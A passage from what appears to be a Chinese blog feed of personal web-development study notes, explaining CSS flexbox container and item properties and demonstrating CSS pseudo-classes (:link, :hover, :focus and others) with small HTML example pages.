父元素的主轴是指子元素布局的主要方向轴，注意主轴不一定是水平的，它由属性flex-direction来确定主轴是水平还是垂直的（后面会介绍）。</span><br><span class="line">    - **main-start|main-end**: 分别表示主轴的开始和结束，子元素在父元素中会沿着主轴从main-start到main-end排布。</span><br><span class="line">    - **main size**: 单个项目占据主轴的长度大小。</span><br><span class="line">    - **cross axis**: 交叉轴，与主轴垂直。</span><br><span class="line">    - **cross-start|cross-end**: 分别表示交叉轴的开始和结束。子元素在交叉轴的排布从cross-start开始到cross-end。</span><br><span class="line">    - **cross size**: 子元素在交叉轴方向上的大小。</span><br><span class="line"></span><br><span class="line">  #### 以下属性介绍 主要是摘抄指导书中的内容，方便查阅</span><br><span class="line"></span><br><span class="line">  ##### 父元素属性</span><br><span class="line"></span><br><span class="line">  - flex-direction</span><br><span class="line"></span><br><span class="line">    - ![image-20231025194955895](%E5%B8%83%E5%B1%80/image-20231025194955895.png)</span><br><span class="line"></span><br><span class="line">    - flex-direction定义flex布局的主轴方向。flex布局是单方向布局，子元素主要沿着水平行或者垂直列布局。</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">      ```text</span><br><span class="line">      .container &#123;</span><br><span class="line">        flex-direction: row | row-reverse | column | column-reverse;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>  - row: 行方向，flex-direction的默认值，在ltr(left to right， 从左到右)排版方式下从左到右排列，在rtl(right to left， 从右到左)排版方式下从右到左排列。  - row-reverse: 行反方向，在ltr中从右向左，在rtl中从左到右。  - column: 列方向，与row相似，只是从上到下。  - column-reverse: 列反方向，与row-reverse相似，只是从下到上。- ==容器中设置==</code></pre></li><li><p>flex-wrap</p><ul><li><p><img src="/2023/10/18/%E5%B8%83%E5%B1%80/image-20231025195302647.png" alt="image-20231025195302647"></p></li><li><p>默认情况下，flex布局中父元素会把子元素尽可能地排在同一行，通过设置flex-wrap来决定是否允许子元素这行排列。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.container&#123;</span><br><span class="line">  flex-wrap: nowrap | wrap | wrap-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>nowrap: 不折行，默认值，所有的子元素会排在一行。&#x3D;&#x3D;牺牲宽度&#x3D;&#x3D;</li><li>wrap: 折行，子元素会从上到下根据需求折成多行。&#x3D;&#x3D;保证宽度&#x3D;&#x3D;</li><li>wrap-reverse: 从下向上折行，子元素会从下到上根据需求折成多行。</li></ul><p>这里有一些可视化的<a href="https://link.zhihu.com/?target=http://flex-wrap%20%7C%20CSS-Tricks">示例</a>。</p></li></ul></li><li><p>flex-flow</p><p>flex-flow是flex-direction和flex-wrap属性的缩写形式。默认值是row,nowrap。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">flex-flow: &lt;‘flex-direction’&gt; || &lt;‘flex-wrap’&gt;</span><br></pre></td></tr></table></figure></li><li><p>justify-content</p><p><img src="/2023/10/18/%E5%B8%83%E5%B1%80/v2-2ae1974eab321fc729c10bf87988a327_1440w.webp" alt="img"></p><p>justify-content属性定义了子元素沿&#x3D;&#x3D;主轴方向&#x3D;&#x3D;的对齐方式，用来当子元素大小最大的时候，分配主轴上的剩余空间。也可以当子元素超出主轴的时候用来控制子元素的对齐方式。</p><ul><li>flex-start: 默认值，朝主轴开始的方向对齐。</li><li>flex-end: 朝主轴结束的方向对齐。</li><li>center: 沿主轴方向居中。</li><li>space-between: 沿主轴两端对齐，第一个子元素在主轴起点，最后一个子元素在主轴终点。</li><li>space-around: 沿主轴子元素之间均匀分布。要注意的是子元素看起来间隙是不均匀的，第一个子元素和最后一个子元素离父元素的边缘有一个单位的间隙，但两个子元素之间有两个单位的间隙，因为每个子元素的两侧都有一个单位的间隙。</li></ul><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.container &#123;</span><br><span class="line">  justify-content: flex-start | flex-end | center | space-between | space-around;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>align-items</p><p><img src="/2023/10/18/%E5%B8%83%E5%B1%80/v2-7b84a2730c8037555857cb44de2f7346_1440w-16982370587783.webp" alt="img"></p><p>align-items定义了子元素在交叉轴方向的对齐方向，这是在每个子元素仍然在其原来所在行的基础上所说的。可以看作是交叉轴上的justify-content属性;</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.container &#123;</span><br><span class="line">  align-items: flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>flex-start: 按照交叉轴的起点对齐。</li><li>flex-end: 按照交叉轴的终点对齐。</li><li>center: 沿交叉轴方向居中。</li><li>baseline: 按照项目的第一行文字的基线对齐。</li><li>stretch: 默认值，在满足子项目所设置的min-height、max-height、height的情况下拉伸子元素使之填充整个父元素。</li><li>注意，&#x3D;&#x3D;拉伸的盒子不能设置高度或宽度&#x3D;&#x3D;</li></ul></li><li><p>align-content</p><p><img src="/2023/10/18/%E5%B8%83%E5%B1%80/v2-af67fe3ee5574ef1df771b80637c1e29_1440w.webp" alt="img"></p><p>align-content是当父元素所包含的行在交叉轴方向有空余部分时如何分配空间。与justify-content在主轴上如何对单个子元素对齐很相似。</p><p><strong>注意</strong>：当只有一行的时候，该属性并不起作用。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.container &#123;</span><br><span class="line">  align-content: flex-start | flex-end | center | space-between | space-around | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>译者注</strong>：该属性中的六个属性值与justify-content中的六个属性意思相似，不同之处在于justify-content沿主轴方向的作用于单个子元素，而align-content沿交叉轴方向作用于行。遂不再赘述各属性值含义。</p><p><strong>译者注</strong>：注意align-items和align-content的区别，前者是指在单行内的子元素对齐方式，后者是指多行之间的对齐方式。</p></blockquote></li></ul><h5 id="子元素属性"><a href="#子元素属性" class="headerlink" title="子元素属性"></a>子元素属性</h5><ul><li><p>order</p><p><img src="/2023/10/18/%E5%B8%83%E5%B1%80/v2-256aca2806649bee6b69127998b14027_1440w.webp" alt="img"></p><p>默认情况下，子元素按照代码书写的先后顺序布局，但order属性可以更改子元素出现的顺序。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.item &#123;</span><br><span class="line">  order: &lt;integer&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>译者注</strong>：order的默认值为0;子元素的order值越小，布局越排在前面，参考例图理解。</p></blockquote></li><li><p>​</p></li><li><h4 id="flex-grow"><a href="#flex-grow" class="headerlink" title="flex-grow"></a>flex-grow</h4><p><img src="/2023/10/18/%E5%B8%83%E5%B1%80/v2-92fb64a2b44a5f1175c3738dbddc222b_1440w.webp" alt="img"></p><p>flex-grow规定在空间允许的情况下，子元素如何按照&#x3D;&#x3D;比例分配&#x3D;&#x3D;可用剩余空间。如果所有的子元素的属性都设定为1，则父元素中的剩余空间会等分给所有子元素。如果其中某个子元素的flex-grow设定为2，则在分配剩余空间时该子元素将获得其他元素二倍的空间（至少会尽力获得）。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.item &#123;</span><br><span class="line">  flex-grow: &lt;number&gt;; /* default 0 */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注</strong>：flex-grow不接受负值。</p><blockquote><p><strong>译者注</strong>：默认值为0，意味着即使有剩余空间，各子元素也不会放大。</p></blockquote></li><li><p>flex-shrink</p><p>与flex-grow属性类似，flex-shrink定义了空间不足时项目的缩小比例。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.item &#123;</span><br><span class="line">  flex-shrink: &lt;number&gt;; /* default 1 */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注</strong>： flex-shrink不接受负值。</p><blockquote><p><strong>译者注</strong>：flex-shrink默认值为1， 当所有子元素都为默认值时，则空间不足时子元素会同比例缩小。如果其中某个子元素的flex-shrink值为0，则空间不足时该子元素并不会缩小。如果其中某个子元素的flex-shrink值为2时，则空间不足时该子元素会以&#x3D;&#x3D;二倍速度&#x3D;&#x3D;缩小。</p></blockquote></li><li><p>flex-basis</p><p>flex-basis定义了在计算剩余空间之前子元素默认的大小。可以设置为某个长度（e.g. 20%, 5rem, etc.）或者关键字。关键字auto意味着子元素会按照其本来的大小显示。关键字content意味着根据内容来确定大小——这个关键字到目前没有被很好地支持，所以测试起来比较困难，与content的类似的关键字还有max-content, min-content, fit-content。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.item &#123;</span><br><span class="line">  flex-basis: &lt;length&gt; | auto; /* default auto */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果设置为0, 则子元素内容周围的空隙不会根据flex-grow按比例分配，如果设置为auto，则子元素周围额外的空袭会根据flex-grow按照比例分配，如下图：</p><p><img src="/2023/10/18/%E5%B8%83%E5%B1%80/v2-7dee4d296b53945072af021a66e5e666_1440w.webp" alt="img"></p><ul><li>item本身内容决定宽度</li><li>flex-basis在容器中使用</li><li>当其值超过content会按照我的显示</li><li>当其值小于等于content，只由content决定</li><li>当其值会使得元素超过容器宽度，会适配容器宽度调整子元素大小&#x3D;&#x3D;（分栏布局中在一行添加盒子不会被挤下去）&#x3D;&#x3D;</li></ul></li><li><p>align-self</p><p><img src="/2023/10/18/%E5%B8%83%E5%B1%80/v2-37c9db6bce5db3b7a9d55af1600312ef_1440w.webp" alt="img"></p><p>通过设置某个子元素的align-self属性，可以&#x3D;&#x3D;覆盖&#x3D;&#x3D;align-items所设置的对齐方式。属性值与align-items中的意义相同，不再赘述。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.item &#123;</span><br><span class="line">  align-self: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注</strong>：float,clear和vertical-align对flex子元素没有任何影响。</p></li></ul></li></ul><h3 id="Graid布局"><a href="#Graid布局" class="headerlink" title="Graid布局"></a>Graid布局</h3><ul><li>二维网格布局</li><li>只对子元素管用</li><li><img src="/2023/10/18/%E5%B8%83%E5%B1%80/image-20231025212221087.png" alt="image-20231025212221087"></li><li><img src="/2023/10/18/%E5%B8%83%E5%B1%80/image-20231025212241669.png" alt="image-20231025212241669"></li><li><img src="/2023/10/18/%E5%B8%83%E5%B1%80/image-20231025212300432.png" alt="image-20231025212300432"></li><li><img src="/2023/10/18/%E5%B8%83%E5%B1%80/image-20231025212318839.png" alt="image-20231025212318839"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web网页布局 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS进阶</title>
      <link href="/2023/10/11/CSS%E8%BF%9B%E9%98%B6/"/>
      <url>/2023/10/11/CSS%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="伪类"><a href="#伪类" class="headerlink" title="伪类"></a>伪类</h1><p>声明方法</p><p>- </p>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">::伪元素&#123;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br><span class="line">:伪类&#123;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">五种超链接的伪类，顺序有要求：（LV（HFA）</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>伪类的实例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">a</span><span class="selector-pseudo">:link</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: deeppink;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>:yellow;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: black;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>:darkgrey;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: yellow;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>:deeppink;</span></span><br><span class="line"><span class="language-css">      </span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">a</span><span class="selector-pseudo">:active</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">300%</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-weight</span>: <span class="number">900</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">a</span><span class="selector-pseudo">:focus</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>:chartreuse;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: aliceblue;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">4rem</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>演示html a 标签状态的伪类<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">strong</span>&gt;</span>伪元素标签使用来表述元素的状态或者元素位置关系的状态<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">strong</span>&gt;</span>用法：tag:伪类名称<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>对于超链接而言，其状态有如下四种：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>:link:链接未访问状态，链接没有被访问<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>:visted:链接已访问状态，链接被点击过<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>:hover:悬浮状态，鼠标停留在链接上方<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>:active:激活状态，对于某一个链接，鼠标左键已经按下，但是还没有回弹<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>:focus:链接获得焦点时的状态（通过tab）<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marker</span>&gt;</span>link 与 visited 在样式⽂件中的顺序任意，相互之间没有影响。 ⽽focus， hover，active这这三个的顺序有要求，乱放后可能会出现显⽰的效果与预想的不同，正常顺序为:focus -&gt; :hover -&gt; :active<span class="tag">&lt;/<span class="name">marker</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>具体实例<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.scu.edu.cn&quot;</span>&gt;</span>四川大学<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.uestc.edu.cn&quot;</span>&gt;</span>电子科技大学<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.swjtu.edu.cn/&quot;</span>&gt;</span>西南交通大学<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.swufe.edu.cn/ &quot;</span>&gt;</span>西南财经大学<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.ucas.ac.cn/&quot;</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不止适用于超链接，也适用于其他元素，hover,active,focous三种状态是全部标签都具有的伪类类别：</p><ul><li>表格：（hfa）</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;Generator&quot;</span> <span class="attr">content</span>=<span class="string">&quot;EditPlus®&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;Author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;Keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;Description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="comment">/*整个表格的样式*/</span></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">table</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border</span>: <span class="number">1px</span> solid blue;</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*border-collapse属性：对表格的线进行折叠*/</span></span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-collapse</span>: collapse;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="comment">/*鼠标悬停时，让当前行显示#868686这种灰色*/</span></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">table</span> <span class="selector-tag">tr</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">background</span>: <span class="number">#868686</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="comment">/*每个单元格的样式*/</span></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">table</span> <span class="selector-tag">td</span>&#123;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">border</span>:<span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>输入框：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>常用标签用到的伪元素标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      伪类选择器：动态伪类</span></span></span><br><span class="line"><span class="comment"><span class="language-css">    */</span></span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">     <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      让文本框获取焦点时：</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      边框：#FF6F3D这种橙色</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      文字：绿色</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      背景色：#6a6a6a这种灰色</span></span></span><br><span class="line"><span class="comment"><span class="language-css">     */</span></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">input</span><span class="selector-pseudo">:focus</span>&#123;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">border</span>:<span class="number">3px</span> solid <span class="number">#FF6F3D</span>;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">color</span>:white;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">background-color</span>:<span class="number">#6a6a6a</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">      <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      鼠标放在标签上时显示蓝色</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      */</span></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">label</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">color</span>:blue;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">      <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      点击标签鼠标没有松开时显示红色</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      */</span></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">label</span><span class="selector-pseudo">:active</span>&#123;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">color</span>:red;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>hover,active,focous三种状态是全部标签都具有的伪类类别<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;lg&quot;</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lg&quot;</span> <span class="attr">id</span>=<span class="string">&quot;lg&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入姓名&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>其他常用的伪类选择器：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>其他常用伪类标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-pseudo">:checked</span>&#123;</span></span><br><span 